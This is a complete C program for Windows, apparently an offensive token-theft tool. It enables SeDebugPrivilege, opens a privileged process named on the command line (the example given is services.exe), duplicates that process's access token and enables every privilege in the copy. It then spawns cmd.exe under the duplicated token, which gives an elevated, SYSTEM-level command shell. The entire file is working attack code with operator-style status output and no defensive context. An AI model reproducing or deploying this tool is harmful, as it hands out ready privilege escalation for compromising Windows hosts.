#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>

// ─────────────────────────────────────────────
// Enable SeDebugPrivilege
// ─────────────────────────────────────────────
BOOL EnableSeDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                          &hToken)) {
        printf("[-] OpenProcessToken failed: %lu\n", GetLastError());
        return FALSE;
    }
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        printf("[-] LookupPrivilegeValue failed: %lu\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        printf("[-] AdjustTokenPrivileges failed: %lu\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }
    CloseHandle(hToken);
    return TRUE;
}

// ─────────────────────────────────────────────
// Enable ALL privileges on duplicated token
// ─────────────────────────────────────────────
BOOL EnableAllPrivileges(HANDLE hToken) {
    DWORD bytesNeeded = 0;
    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &bytesNeeded);
    PTOKEN_PRIVILEGES pTp = (PTOKEN_PRIVILEGES)malloc(bytesNeeded);
    if (!pTp) return FALSE;

    if (GetTokenInformation(hToken, TokenPrivileges, pTp, bytesNeeded, &bytesNeeded)) {
        for (DWORD i = 0; i < pTp->PrivilegeCount; i++) {
            pTp->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED;
        }
        AdjustTokenPrivileges(hToken, FALSE, pTp, 0, NULL, NULL);
    }
    free(pTp);
    return TRUE;
}

// ─────────────────────────────────────────────
// Find target process PID by name
// ─────────────────────────────────────────────
DWORD FindProcessPID(const char* processName) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    DWORD pid = 0;
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[-] CreateToolhelp32Snapshot failed: %lu\n", GetLastError());
        return 0;
    }
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hSnapshot, &pe32)) {
        printf("[-] Process32First failed: %lu\n", GetLastError());
        CloseHandle(hSnapshot);
        return 0;
    }
    do {
        if (_stricmp(pe32.szExeFile, processName) == 0) {
            pid = pe32.th32ProcessID;
            printf("[+] Found process: %s PID: %lu\n", pe32.szExeFile, pid);
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));
    if (pid == 0)
        printf("[-] Process \"%s\" not found.\n", processName);
    CloseHandle(hSnapshot);
    return pid;
}

// ─────────────────────────────────────────────
// Open handle (works better on PPL processes)
// ─────────────────────────────────────────────
HANDLE get_process_handle(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (hProcess == NULL) {
        printf("[-] OpenProcess failed for PID %lu: %lu\n", pid, GetLastError());
        return NULL;
    }
    printf("[+] Got handle to PID %lu\n", pid);
    return hProcess;
}

// ─────────────────────────────────────────────
// Duplicate token
// ─────────────────────────────────────────────
HANDLE DuplicateProcessToken(HANDLE hProcess) {
    HANDLE hToken = NULL;
    HANDLE hTokenDup = NULL;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        printf("[-] OpenProcessToken failed: %lu\n", GetLastError());
        return NULL;
    }
    printf("[+] Opened process token.\n");

    if (!DuplicateTokenEx(
            hToken,
            MAXIMUM_ALLOWED,
            NULL,
            SecurityDelegation,
            TokenPrimary,
            &hTokenDup)) {
        printf("[-] DuplicateTokenEx failed: %lu\n", GetLastError());
        CloseHandle(hToken);
        return NULL;
    }

    EnableAllPrivileges(hTokenDup);

    printf("[+] Token duplicated successfully.\n");
    CloseHandle(hToken);
    return hTokenDup;
}

// ─────────────────────────────────────────────
// Spawn process
// ─────────────────────────────────────────────
BOOL SpawnProcessWithToken(HANDLE hToken) {
    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(STARTUPINFOW);
    if (!CreateProcessWithTokenW(
            hToken,
            LOGON_WITH_PROFILE,
            L"C:\\Windows\\System32\\cmd.exe",
            NULL,
            CREATE_NEW_CONSOLE,
            NULL,
            NULL,
            &si,
            &pi)) {
        printf("[-] CreateProcessWithTokenW failed: %lu\n", GetLastError());
        return FALSE;
    }
    printf("[+] Process spawned successfully.\n");
    printf("[+] PID: %lu TID: %lu\n", pi.dwProcessId, pi.dwThreadId);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;
}

// ─────────────────────────────────────────────
// Main
// ─────────────────────────────────────────────
int main(int argc, char* argv[]) {
    if (argc != 2) {
        printf("Usage: %s <process_name>\n", argv[0]);
        printf("Example: %s services.exe\n", argv[0]);
        return 1;
    }
    if (!EnableSeDebugPrivilege()) {
        printf("[-] Failed to enable SeDebugPrivilege.\n");
        return 1;
    }
    printf("[+] SeDebugPrivilege enabled.\n");

    DWORD pid = FindProcessPID(argv[1]);
    if (pid == 0) {
        printf("[-] Process \"%s\" not found.\n", argv[1]);
        return 1;
    }
    printf("[+] Target PID: %lu\n", pid);

    HANDLE hProcess = get_process_handle(pid);
    if (hProcess == NULL) {
        printf("[-] Failed to get process handle.\n");
        return 1;
    }

    HANDLE hDupToken = DuplicateProcessToken(hProcess);
    if (hDupToken == NULL) {
        printf("[-] Failed to duplicate token.\n");
        CloseHandle(hProcess);
        return 1;
    }

    if (!SpawnProcessWithToken(hDupToken)) {
        printf("[-] Failed to spawn process.\n");
        CloseHandle(hDupToken);
        CloseHandle(hProcess);
        return 1;
    }

    CloseHandle(hDupToken);
    CloseHandle(hProcess);
    printf("[+] Done.\n");
    return 0;
}
